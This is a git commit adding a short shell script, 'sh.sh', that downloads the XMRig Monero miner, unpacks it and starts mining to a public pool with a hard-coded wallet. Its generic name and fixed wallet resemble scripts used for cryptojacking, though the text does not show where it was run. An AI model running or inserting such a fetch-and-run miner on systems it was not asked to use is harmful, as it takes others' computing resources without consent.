bf4a92dd6a7416a996a7b4b130ce5f98c55c4773
juggernaut <93597297+nop3g@users.noreply.github.com>
2022-04-16 00:47:42 +0400

    Create sh.sh

---
+++ sh.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:4444 -u 42q97h148z54mt5QWSJZUHWhZiic3PD8aiqr8w7BWvKBStAU6JT58gXNrMA9fwu2xfijurDrPEgY92qHdipJLT88Abw9rLb -k --tls --rig-id rig
